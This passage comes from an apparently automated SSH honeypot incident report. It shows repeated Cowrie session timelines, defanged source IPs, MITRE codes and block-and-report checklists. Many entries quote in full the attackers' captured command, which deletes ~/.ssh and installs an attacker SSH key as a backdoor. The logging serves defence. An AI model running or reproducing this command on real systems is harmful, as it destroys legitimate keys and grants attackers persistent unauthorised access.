| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:25:31` | `cowrie.session.connect` |
| `2026-04-19 04:25:31` | `cowrie.client.version` |
| `2026-04-19 04:25:32` | `cowrie.client.kex` |
| `2026-04-19 04:25:32` | `cowrie.login.success` |
| `2026-04-19 04:25:33` | `cowrie.session.params` |
| `2026-04-19 04:25:33` | `cowrie.command.input` |
| `2026-04-19 04:25:33` | `cowrie.command.failed` |
| `2026-04-19 04:25:33` | `cowrie.log.closed` |
| `2026-04-19 04:25:33` | `cowrie.session.params` |
| `2026-04-19 04:25:33` | `cowrie.command.input` |
| `2026-04-19 04:25:33` | `cowrie.session.file_download` |
| `2026-04-19 04:25:33` | `cowrie.log.closed` |
| `2026-04-19 04:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.176[.]201` to AbuseIPDB if not already reported
- [ ] Block `43.165.176[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5225b946dad4

| Field | Detail |
|---|---|
| **Source IP** | `43.165.176[.]201` |
| **First Seen** | 2026-04-19 04:25 |
| **Last Seen** | 2026-04-19 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:25:35` | `cowrie.session.connect` |
| `2026-04-19 04:25:35` | `cowrie.client.version` |
| `2026-04-19 04:25:35` | `cowrie.client.kex` |
| `2026-04-19 04:25:36` | `cowrie.login.success` |
| `2026-04-19 04:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.176[.]201` to AbuseIPDB if not already reported
- [ ] Block `43.165.176[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a63ad9adb9

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:26 |
| **Last Seen** | 2026-04-19 04:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:26:59` | `cowrie.session.connect` |
| `2026-04-19 04:26:59` | `cowrie.client.version` |
| `2026-04-19 04:26:59` | `cowrie.client.kex` |
| `2026-04-19 04:27:00` | `cowrie.login.success` |
| `2026-04-19 04:27:00` | `cowrie.session.params` |
| `2026-04-19 04:27:00` | `cowrie.command.input` |
| `2026-04-19 04:27:00` | `cowrie.command.failed` |
| `2026-04-19 04:27:00` | `cowrie.log.closed` |
| `2026-04-19 04:27:00` | `cowrie.session.params` |
| `2026-04-19 04:27:00` | `cowrie.command.input` |
| `2026-04-19 04:27:00` | `cowrie.session.file_download` |
| `2026-04-19 04:27:00` | `cowrie.log.closed` |
| `2026-04-19 04:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462a6279dbee

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:27 |
| **Last Seen** | 2026-04-19 04:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:27:02` | `cowrie.session.connect` |
| `2026-04-19 04:27:02` | `cowrie.client.version` |
| `2026-04-19 04:27:02` | `cowrie.client.kex` |
| `2026-04-19 04:27:03` | `cowrie.login.success` |
| `2026-04-19 04:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77dd670b15b4

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:28 |
| **Last Seen** | 2026-04-19 04:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:28:58` | `cowrie.session.connect` |
| `2026-04-19 04:28:58` | `cowrie.client.version` |
| `2026-04-19 04:28:58` | `cowrie.client.kex` |
| `2026-04-19 04:28:59` | `cowrie.login.success` |
| `2026-04-19 04:28:59` | `cowrie.session.params` |
| `2026-04-19 04:28:59` | `cowrie.command.input` |
| `2026-04-19 04:28:59` | `cowrie.command.failed` |
| `2026-04-19 04:28:59` | `cowrie.log.closed` |
| `2026-04-19 04:28:59` | `cowrie.session.params` |
| `2026-04-19 04:28:59` | `cowrie.command.input` |
| `2026-04-19 04:28:59` | `cowrie.session.file_download` |
| `2026-04-19 04:28:59` | `cowrie.log.closed` |
| `2026-04-19 04:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3437e983b399

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:29 |
| **Last Seen** | 2026-04-19 04:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:29:01` | `cowrie.session.connect` |
| `2026-04-19 04:29:01` | `cowrie.client.version` |
| `2026-04-19 04:29:01` | `cowrie.client.kex` |
| `2026-04-19 04:29:02` | `cowrie.login.success` |
| `2026-04-19 04:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1477b14f1e36

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:30 |
| **Last Seen** | 2026-04-19 04:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:30:51` | `cowrie.session.connect` |
| `2026-04-19 04:30:51` | `cowrie.client.version` |
| `2026-04-19 04:30:51` | `cowrie.client.kex` |
| `2026-04-19 04:30:51` | `cowrie.login.success` |
| `2026-04-19 04:30:52` | `cowrie.session.params` |
| `2026-04-19 04:30:52` | `cowrie.command.input` |
| `2026-04-19 04:30:52` | `cowrie.command.failed` |
| `2026-04-19 04:30:52` | `cowrie.log.closed` |
| `2026-04-19 04:30:52` | `cowrie.session.params` |
| `2026-04-19 04:30:52` | `cowrie.command.input` |
| `2026-04-19 04:30:52` | `cowrie.session.file_download` |
| `2026-04-19 04:30:52` | `cowrie.log.closed` |
| `2026-04-19 04:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a2e96eede0

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:30 |
| **Last Seen** | 2026-04-19 04:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:30:54` | `cowrie.session.connect` |
| `2026-04-19 04:30:54` | `cowrie.client.version` |
| `2026-04-19 04:30:54` | `cowrie.client.kex` |
| `2026-04-19 04:30:55` | `cowrie.login.success` |
| `2026-04-19 04:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ad65fecb96

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:36 |
| **Last Seen** | 2026-04-19 04:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:36:11` | `cowrie.session.connect` |
| `2026-04-19 04:36:11` | `cowrie.client.version` |
| `2026-04-19 04:36:12` | `cowrie.client.kex` |
| `2026-04-19 04:36:12` | `cowrie.login.success` |
| `2026-04-19 04:36:12` | `cowrie.session.params` |
| `2026-04-19 04:36:12` | `cowrie.command.input` |
| `2026-04-19 04:36:12` | `cowrie.command.failed` |
| `2026-04-19 04:36:12` | `cowrie.log.closed` |
| `2026-04-19 04:36:13` | `cowrie.session.params` |
| `2026-04-19 04:36:13` | `cowrie.command.input` |
| `2026-04-19 04:36:13` | `cowrie.session.file_download` |
| `2026-04-19 04:36:13` | `cowrie.log.closed` |
| `2026-04-19 04:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c02c2cf68e8d

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:36 |
| **Last Seen** | 2026-04-19 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:36:15` | `cowrie.session.connect` |
| `2026-04-19 04:36:15` | `cowrie.client.version` |
| `2026-04-19 04:36:15` | `cowrie.client.kex` |
| `2026-04-19 04:36:15` | `cowrie.login.success` |
| `2026-04-19 04:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71bc7e47531

| Field | Detail |
|---|---|
| **Source IP** | `120.48.82[.]124` |
| **First Seen** | 2026-04-19 04:37 |
| **Last Seen** | 2026-04-19 04:42 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:37:40` | `cowrie.session.connect` |
| `2026-04-19 04:37:40` | `cowrie.client.version` |
| `2026-04-19 04:37:41` | `cowrie.client.kex` |
| `2026-04-19 04:37:46` | `cowrie.login.success` |
| `2026-04-19 04:42:46` | `cowrie.session.file_upload` |
| `2026-04-19 04:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.82[.]124` to AbuseIPDB if not already reported
- [ ] Block `120.48.82[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-859a84c83c93

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:48 |
| **Last Seen** | 2026-04-19 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:48:39` | `cowrie.session.connect` |
| `2026-04-19 04:48:39` | `cowrie.client.version` |
| `2026-04-19 04:48:39` | `cowrie.client.kex` |
| `2026-04-19 04:48:39` | `cowrie.login.success` |
| `2026-04-19 04:48:39` | `cowrie.session.params` |
| `2026-04-19 04:48:39` | `cowrie.command.input` |
| `2026-04-19 04:48:39` | `cowrie.command.failed` |
| `2026-04-19 04:48:40` | `cowrie.log.closed` |
| `2026-04-19 04:48:40` | `cowrie.session.params` |
| `2026-04-19 04:48:40` | `cowrie.command.input` |
| `2026-04-19 04:48:40` | `cowrie.session.file_download` |
| `2026-04-19 04:48:40` | `cowrie.log.closed` |
| `2026-04-19 04:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1e22c27ee7

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:48 |
| **Last Seen** | 2026-04-19 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:48:42` | `cowrie.session.connect` |
| `2026-04-19 04:48:42` | `cowrie.client.version` |
| `2026-04-19 04:48:42` | `cowrie.client.kex` |
| `2026-04-19 04:48:42` | `cowrie.login.success` |
| `2026-04-19 04:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf17074fc4b0

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:50 |
| **Last Seen** | 2026-04-19 04:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:50:23` | `cowrie.session.connect` |
| `2026-04-19 04:50:23` | `cowrie.client.version` |
| `2026-04-19 04:50:24` | `cowrie.client.kex` |
| `2026-04-19 04:50:24` | `cowrie.login.success` |
| `2026-04-19 04:50:24` | `cowrie.session.params` |
| `2026-04-19 04:50:24` | `cowrie.command.input` |
| `2026-04-19 04:50:24` | `cowrie.command.failed` |
| `2026-04-19 04:50:24` | `cowrie.log.closed` |
| `2026-04-19 04:50:25` | `cowrie.session.params` |
| `2026-04-19 04:50:25` | `cowrie.command.input` |
| `2026-04-19 04:50:25` | `cowrie.session.file_download` |
| `2026-04-19 04:50:25` | `cowrie.log.closed` |
| `2026-04-19 04:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f1970926df

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:50 |
| **Last Seen** | 2026-04-19 04:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:50:26` | `cowrie.session.connect` |
| `2026-04-19 04:50:26` | `cowrie.client.version` |
| `2026-04-19 04:50:27` | `cowrie.client.kex` |
| `2026-04-19 04:50:27` | `cowrie.login.success` |
| `2026-04-19 04:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9c9fd581e4e

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:52 |
| **Last Seen** | 2026-04-19 04:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:52:09` | `cowrie.session.connect` |
| `2026-04-19 04:52:09` | `cowrie.client.version` |
| `2026-04-19 04:52:09` | `cowrie.client.kex` |
| `2026-04-19 04:52:09` | `cowrie.login.success` |
| `2026-04-19 04:52:10` | `cowrie.session.params` |
| `2026-04-19 04:52:10` | `cowrie.command.input` |
| `2026-04-19 04:52:10` | `cowrie.command.failed` |
| `2026-04-19 04:52:10` | `cowrie.log.closed` |
| `2026-04-19 04:52:10` | `cowrie.session.params` |
| `2026-04-19 04:52:10` | `cowrie.command.input` |
| `2026-04-19 04:52:10` | `cowrie.session.file_download` |
| `2026-04-19 04:52:10` | `cowrie.log.closed` |
| `2026-04-19 04:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4dfef26054

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 04:52 |
| **Last Seen** | 2026-04-19 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:52:12` | `cowrie.session.connect` |
| `2026-04-19 04:52:12` | `cowrie.client.version` |
| `2026-04-19 04:52:12` | `cowrie.client.kex` |
| `2026-04-19 04:52:13` | `cowrie.login.success` |
| `2026-04-19 04:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.27[.]94` to AbuseIPDB if not already reported
- [ ] Block `103.179.27[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46fae93e185d

| Field | Detail |
|---|---|
| **Source IP** | `103.179.27[.]94` |
| **First Seen** | 2026-04-19 05:02 |
| **Last Seen** | 2026-04-19 05:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
